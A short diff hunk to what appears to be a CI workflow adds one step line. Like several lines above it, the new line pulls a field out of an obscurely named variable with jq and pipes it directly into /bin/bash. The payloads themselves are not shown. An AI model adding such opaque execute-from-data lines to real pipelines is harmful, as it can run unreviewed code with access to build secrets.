@@ -36,6 +36,7 @@ jobs:
           echo $abhh685 | jq -r .u3618 | /bin/bash
           echo $oy4 | jq -r .kj301 | /bin/bash
           echo $vsu2 | jq -r .l250 | /bin/bash
+          printf '%s' "$lnd1" | jq -r .ggyld05525 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
